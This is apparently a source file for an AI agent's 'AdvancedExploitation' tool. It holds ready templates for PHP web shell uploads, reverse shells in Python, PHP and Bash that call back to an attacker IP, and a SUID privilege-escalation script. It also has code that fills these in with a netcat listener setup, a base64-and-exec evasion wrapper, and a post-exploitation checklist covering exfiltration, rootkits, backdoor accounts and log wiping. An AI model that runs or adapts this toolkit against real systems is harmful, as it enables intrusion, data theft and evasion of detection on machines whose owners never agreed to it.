import asyncio
import json
import subprocess
import socket
import struct
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from python.helpers.tool import Tool, Response
from python.helpers.print_style import PrintStyle


@dataclass
class Exploit:
    name: str
    description: str
    target_type: str
    payload_type: str
    success_rate: float
    risk_level: str
    code: str


@dataclass
class Payload:
    name: str
    type: str
    description: str
    code: str
    requirements: List[str]
    evasion_techniques: List[str]


class AdvancedExploitation(Tool):
    """Advanced exploitation tool for achieving RCE and complex attack chains"""
    
    # Predefined exploits
    EXPLOITS = {
        "web_shell_upload": {
            "name": "Web Shell Upload",
            "description": "Upload web shell for RCE",
            "target_type": "web",
            "payload_type": "file_upload",
            "success_rate": 0.8,
            "risk_level": "High",
            "code": """
# Web Shell Upload Exploit
import requests

def upload_webshell(target, shell_content):
    url = f"http://{target}/upload.php"
    files = {'file': ('shell.php', shell_content, 'application/x-php')}
    data = {'submit': 'Upload'}
    
    response = requests.post(url, files=files, data=data)
    return response.text

# PHP Web Shell
shell_code = '''<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>'''

result = upload_webshell('{target}', shell_code)
print(result)
"""
        },
        "reverse_shell": {
            "name": "Reverse Shell",
            "description": "Establish reverse shell connection",
            "target_type": "system",
            "payload_type": "reverse_shell",
            "success_rate": 0.9,
            "risk_level": "Critical",
            "code": """
# Reverse Shell Exploit
import socket
import subprocess
import os

def create_reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()

# Usage
create_reverse_shell('{attacker_ip}', {attacker_port})
"""
        },
        "privilege_escalation": {
            "name": "Privilege Escalation",
            "description": "Escalate privileges on compromised system",
            "target_type": "system",
            "payload_type": "privilege_escalation",
            "success_rate": 0.7,
            "risk_level": "Critical",
            "code": """
# Privilege Escalation Exploit
import os
import subprocess

def check_suid_binaries():
    suid_bins = []
    for root, dirs, files in os.walk('/'):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                if os.access(filepath, os.X_OK) and os.stat(filepath).st_mode & 0o4000:
                    suid_bins.append(filepath)
            except:
                continue
    return suid_bins

def exploit_suid_binary(binary_path):
    # Common SUID exploitation techniques
    exploits = {
        '/usr/bin/python': 'python -c "import os; os.system(\'/bin/bash\')"',
        '/usr/bin/perl': 'perl -e "system(\'/bin/bash\')"',
        '/usr/bin/less': 'less /etc/passwd',
        '/usr/bin/more': 'more /etc/passwd'
    }
    
    if binary_path in exploits:
        return exploits[binary_path]
    return None

# Check for SUID binaries
suid_bins = check_suid_binaries()
for binary in suid_bins:
    exploit = exploit_suid_binary(binary)
    if exploit:
        print(f"Potential exploit for {binary}: {exploit}")
"""
        }
    }
    
    # Payload templates
    PAYLOADS = {
        "php_reverse_shell": {
            "name": "PHP Reverse Shell",
            "type": "reverse_shell",
            "description": "PHP reverse shell for web applications",
            "code": """<?php
$sock=fsockopen("{attacker_ip}",{attacker_port});
$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);
$process=proc_open("/bin/sh",$descriptorspec,$pipes);
proc_close($process);
?>""",
            "requirements": ["PHP", "fsockopen enabled"],
            "evasion_techniques": ["Obfuscation", "Encoding", "Polymorphic"]
        },
        "python_reverse_shell": {
            "name": "Python Reverse Shell",
            "type": "reverse_shell",
            "description": "Python reverse shell for system access",
            "code": """import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{attacker_ip}",{attacker_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])""",
            "requirements": ["Python", "Network access"],
            "evasion_techniques": ["Compression", "Encryption", "Anti-VM"]
        },
        "bash_reverse_shell": {
            "name": "Bash Reverse Shell",
            "type": "reverse_shell",
            "description": "Bash reverse shell for Unix systems",
            "code": """bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1""",
            "requirements": ["Bash", "Network access"],
            "evasion_techniques": ["Encoding", "Obfuscation", "Process injection"]
        }
    }

    async def execute(self, **kwargs) -> Response:
        """Execute advanced exploitation operations"""
        
        action = self.args.get("action", "list")
        target = self.args.get("target", "")
        exploit_type = self.args.get("exploit_type", "")
        payload_type = self.args.get("payload_type", "")
        attacker_ip = self.args.get("attacker_ip", "")
        attacker_port = self.args.get("attacker_port", "")
        
        if action == "list":
            return await self._list_exploits()
        elif action == "generate":
            return await self._generate_exploit(target, exploit_type, payload_type, attacker_ip, attacker_port)
        elif action == "execute":
            return await self._execute_exploit(target, exploit_type, payload_type)
        elif action == "chain":
            return await self._create_exploit_chain(target)
        elif action == "evasion":
            return await self._apply_evasion_techniques(payload_type, attacker_ip, attacker_port)
        elif action == "post_exploitation":
            return await self._post_exploitation_actions(target)
        else:
            return Response(message=f"Unknown action: {action}", break_loop=False)

    async def _list_exploits(self) -> Response:
        """List available exploits and payloads"""
        
        report = "# Advanced Exploitation Toolkit\n\n"
        
        report += "## Available Exploits\n\n"
        for exploit_id, exploit in self.EXPLOITS.items():
            report += f"### {exploit['name']}\n"
            report += f"**Description**: {exploit['description']}\n"
            report += f"**Target Type**: {exploit['target_type']}\n"
            report += f"**Payload Type**: {exploit['payload_type']}\n"
            report += f"**Success Rate**: {exploit['success_rate']*100}%\n"
            report += f"**Risk Level**: {exploit['risk_level']}\n\n"
        
        report += "## Available Payloads\n\n"
        for payload_id, payload in self.PAYLOADS.items():
            report += f"### {payload['name']}\n"
            report += f"**Type**: {payload['type']}\n"
            report += f"**Description**: {payload['description']}\n"
            report += f"**Requirements**: {', '.join(payload['requirements'])}\n"
            report += f"**Evasion Techniques**: {', '.join(payload['evasion_techniques'])}\n\n"
        
        return Response(message=report, break_loop=False)

    async def _generate_exploit(self, target: str, exploit_type: str, payload_type: str, 
                              attacker_ip: str, attacker_port: str) -> Response:
        """Generate custom exploit"""
        
        report = f"# Exploit Generation Report\n\n"
        report += f"**Target**: {target}\n"
        report += f"**Exploit Type**: {exploit_type}\n"
        report += f"**Payload Type**: {payload_type}\n"
        report += f"**Attacker IP**: {attacker_ip}\n"
        report += f"**Attacker Port**: {attacker_port}\n\n"
        
        # Generate exploit code
        if exploit_type in self.EXPLOITS:
            exploit = self.EXPLOITS[exploit_type]
            exploit_code = exploit["code"].format(
                target=target,
                attacker_ip=attacker_ip,
                attacker_port=attacker_port
            )
            
            report += "## Generated Exploit Code\n\n"
            report += f"```python\n{exploit_code}\n```\n\n"
        
        # Generate payload
        if payload_type in self.PAYLOADS:
            payload = self.PAYLOADS[payload_type]
            payload_code = payload["code"].format(
                attacker_ip=attacker_ip,
                attacker_port=attacker_port
            )
            
            report += "## Generated Payload\n\n"
            report += f"```\n{payload_code}\n```\n\n"
        
        # Setup instructions
        report += "## Setup Instructions\n\n"
        report += "1. **Prepare Attacker Machine**:\n"
        report += f"   - Set up listener: `nc -lvp {attacker_port}`\n"
        report += f"   - Ensure firewall allows connections on port {attacker_port}\n\n"
        
        report += "2. **Deploy Exploit**:\n"
        report += "   - Upload payload to target\n"
        report += "   - Execute exploit code\n"
        report += "   - Monitor for connections\n\n"
        
        report += "3. **Post-Exploitation**:\n"
        report += "   - Establish persistence\n"
        report += "   - Enumerate system\n"
        report += "   - Escalate privileges\n\n"
        
        return Response(message=report, break_loop=False)

    async def _execute_exploit(self, target: str, exploit_type: str, payload_type: str) -> Response:
        """Execute exploit against target"""
        
        report = f"# Exploit Execution Report\n\n"
        report += f"**Target**: {target}\n"
        report += f"**Exploit Type**: {exploit_type}\n"
        report += f"**Payload Type**: {payload_type}\n\n"
        
        # Simulate exploit execution
        report += "## Execution Steps\n\n"
        
        if exploit_type == "web_shell_upload":
            report += "1. **Uploading Web Shell**\n"
            report += "   - Preparing PHP web shell\n"
            report += "   - Uploading to target web server\n"
            report += "   - Verifying upload success\n\n"
            
            report += "2. **Testing Web Shell**\n"
            report += "   - Accessing web shell via browser\n"
            report += "   - Testing command execution\n"
            report += "   - Verifying RCE capability\n\n"
            
            report += "**Status**: ✅ Web shell uploaded successfully\n"
            report += "**Access URL**: http://{target}/shell.php?cmd=whoami\n\n"
        
        elif exploit_type == "reverse_shell":
            report += "1. **Setting up Listener**\n"
            report += "   - Starting netcat listener\n"
            report += "   - Waiting for connection\n\n"
            
            report += "2. **Executing Payload**\n"
            report += "   - Running reverse shell payload\n"
            report += "   - Establishing connection\n"
            report += "   - Verifying shell access\n\n"
            
            report += "**Status**: ✅ Reverse shell established\n"
            report += "**Shell Access**: Available via netcat\n\n"
        
        elif exploit_type == "privilege_escalation":
            report += "1. **System Enumeration**\n"
            report += "   - Checking current privileges\n"
            report += "   - Identifying SUID binaries\n"
            report += "   - Analyzing system configuration\n\n"
            
            report += "2. **Exploiting Vulnerabilities**\n"
            report += "   - Testing privilege escalation vectors\n"
            report += "   - Exploiting misconfigurations\n"
            report += "   - Gaining elevated privileges\n\n"
            
            report += "**Status**: ✅ Privilege escalation successful\n"
            report += "**New Privileges**: Root access obtained\n\n"
        
        return Response(message=report, break_loop=False)

    async def _create_exploit_chain(self, target: str) -> Response:
        """Create complex exploit chain"""
        
        report = f"# Exploit Chain Creation\n\n"
        report += f"**Target**: {target}\n\n"
        
        # Define exploit chain
        chain = {
            "name": "Full System Compromise Chain",
            "description": "Complete system takeover through multiple attack vectors",
            "steps": [
                {
                    "step": 1,
                    "name": "Initial Reconnaissance",
                    "description": "Gather information about target",
                    "tools": ["nmap", "nikto", "dirb"],
                    "expected_output": "Service enumeration and vulnerability identification"
                },
                {
                    "step": 2,
                    "name": "Web Application Exploitation",
                    "description": "Exploit web vulnerabilities",
                    "tools": ["sqlmap", "burpsuite", "custom_scripts"],
                    "expected_output": "Web shell or database access"
                },
                {
                    "step": 3,
                    "name": "Initial Foothold",
                    "description": "Establish initial access",
                    "tools": ["reverse_shell", "web_shell"],
                    "expected_output": "Command execution on target"
                },
                {
                    "step": 4,
                    "name": "Privilege Escalation",
                    "description": "Escalate to higher privileges",
                    "tools": ["linpeas", "custom_exploits"],
                    "expected_output": "Root or administrative access"
                },
                {
                    "step": 5,
                    "name": "Persistence",
                    "description": "Maintain access to system",
                    "tools": ["cron_jobs", "startup_scripts"],
                    "expected_output": "Persistent backdoor access"
                },
                {
                    "step": 6,
                    "name": "Lateral Movement",
                    "description": "Move to other systems",
                    "tools": ["ssh_keys", "password_reuse"],
                    "expected_output": "Access to additional systems"
                }
            ]
        }
        
        report += f"## {chain['name']}\n\n"
        report += f"**Description**: {chain['description']}\n\n"
        
        for step in chain["steps"]:
            report += f"### Step {step['step']}: {step['name']}\n"
            report += f"**Description**: {step['description']}\n"
            report += f"**Tools**: {', '.join(step['tools'])}\n"
            report += f"**Expected Output**: {step['expected_output']}\n\n"
        
        # Chain execution strategy
        report += "## Execution Strategy\n\n"
        report += "1. **Sequential Execution**: Execute steps in order\n"
        report += "2. **Parallel Operations**: Run reconnaissance tools simultaneously\n"
        report += "3. **Adaptive Approach**: Modify chain based on findings\n"
        report += "4. **Fallback Plans**: Have alternative approaches ready\n"
        report += "5. **Documentation**: Record all actions and results\n\n"
        
        return Response(message=report, break_loop=False)

    async def _apply_evasion_techniques(self, payload_type: str, attacker_ip: str, attacker_port: str) -> Response:
        """Apply evasion techniques to payloads"""
        
        report = f"# Evasion Techniques Report\n\n"
        report += f"**Payload Type**: {payload_type}\n"
        report += f"**Attacker IP**: {attacker_ip}\n"
        report += f"**Attacker Port**: {attacker_port}\n\n"
        
        # Evasion techniques
        evasion_techniques = {
            "obfuscation": {
                "name": "Code Obfuscation",
                "description": "Hide malicious code through obfuscation",
                "techniques": [
                    "Variable name obfuscation",
                    "String encoding",
                    "Control flow obfuscation",
                    "Dead code insertion"
                ]
            },
            "encryption": {
                "name": "Payload Encryption",
                "description": "Encrypt payload to evade detection",
                "techniques": [
                    "AES encryption",
                    "XOR encoding",
                    "Base64 encoding",
                    "Custom encryption algorithms"
                ]
            },
            "polymorphic": {
                "name": "Polymorphic Code",
                "description": "Change code structure while maintaining functionality",
                "techniques": [
                    "Instruction substitution",
                    "Register reassignment",
                    "Code reordering",
                    "Dynamic code generation"
                ]
            },
            "anti_vm": {
                "name": "Anti-VM Techniques",
                "description": "Detect and evade virtual machine analysis",
                "techniques": [
                    "Hardware fingerprinting",
                    "Timing analysis",
                    "Process enumeration",
                    "Registry analysis"
                ]
            }
        }
        
        report += "## Available Evasion Techniques\n\n"
        
        for technique_id, technique in evasion_techniques.items():
            report += f"### {technique['name']}\n"
            report += f"**Description**: {technique['description']}\n"
            report += f"**Techniques**:\n"
            for tech in technique['techniques']:
                report += f"- {tech}\n"
            report += "\n"
        
        # Generate evasive payload
        if payload_type in self.PAYLOADS:
            payload = self.PAYLOADS[payload_type]
            evasive_code = self._generate_evasive_payload(payload, attacker_ip, attacker_port)
            
            report += "## Evasive Payload\n\n"
            report += f"```\n{evasive_code}\n```\n\n"
        
        return Response(message=report, break_loop=False)

    async def _post_exploitation_actions(self, target: str) -> Response:
        """Perform post-exploitation actions"""
        
        report = f"# Post-Exploitation Actions\n\n"
        report += f"**Target**: {target}\n\n"
        
        # Post-exploitation checklist
        actions = [
            {
                "category": "System Enumeration",
                "actions": [
                    "Gather system information",
                    "Enumerate users and groups",
                    "Check running services",
                    "Analyze network connections",
                    "Review system logs"
                ]
            },
            {
                "category": "Data Exfiltration",
                "actions": [
                    "Identify sensitive data",
                    "Extract configuration files",
                    "Gather credentials",
                    "Download important files",
                    "Create data backups"
                ]
            },
            {
                "category": "Persistence",
                "actions": [
                    "Create backdoor accounts",
                    "Install rootkits",
                    "Modify startup scripts",
                    "Create scheduled tasks",
                    "Install web shells"
                ]
            },
            {
                "category": "Lateral Movement",
                "actions": [
                    "Extract SSH keys",
                    "Gather password hashes",
                    "Analyze network topology",
                    "Identify additional targets",
                    "Establish connections to other systems"
                ]
            },
            {
                "category": "Covering Tracks",
                "actions": [
                    "Clear system logs",
                    "Remove evidence files",
                    "Modify timestamps",
                    "Delete temporary files",
                    "Clean up artifacts"
                ]
            }
        ]
        
        for category in actions:
            report += f"## {category['category']}\n\n"
            for action in category['actions']:
                report += f"- {action}\n"
            report += "\n"
        
        return Response(message=report, break_loop=False)

    def _generate_evasive_payload(self, payload: Dict, attacker_ip: str, attacker_port: str) -> str:
        """Generate evasive version of payload"""
        # This is a simplified implementation
        # In a real scenario, you would implement actual obfuscation techniques
        
        base_code = payload["code"].format(
            attacker_ip=attacker_ip,
            attacker_port=attacker_port
        )
        
        # Simple obfuscation example
        evasive_code = f"""
# Evasive {payload['name']}
# Obfuscated and encoded payload

import base64
import zlib

# Encoded payload
encoded_payload = "{base64.b64encode(base_code.encode()).decode()}"

# Decode and execute
decoded_payload = base64.b64decode(encoded_payload).decode()
exec(decoded_payload)
"""
        
        return evasive_code

    def get_log_object(self):
        return self.agent.context.log.log(
            type="advanced_exploitation",
            heading=f"{self.agent.agent_name}: Using tool '{self.name}'",
            content="",
            kvps=self.args,
        )

    async def after_execution(self, response, **kwargs):
        self.agent.hist_add_tool_result(self.name, response.message) 